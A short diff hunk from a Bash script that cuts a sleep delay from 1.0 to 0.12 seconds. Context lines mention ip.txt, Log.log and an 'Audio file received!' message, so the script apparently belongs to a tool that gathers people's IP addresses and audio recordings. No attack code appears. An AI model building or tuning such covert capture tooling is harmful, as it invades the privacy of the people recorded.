@@ -53,7 +53,7 @@ rm -rf ip.txt
 
 fi
 
-sleep 1.0
+sleep 0.12
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
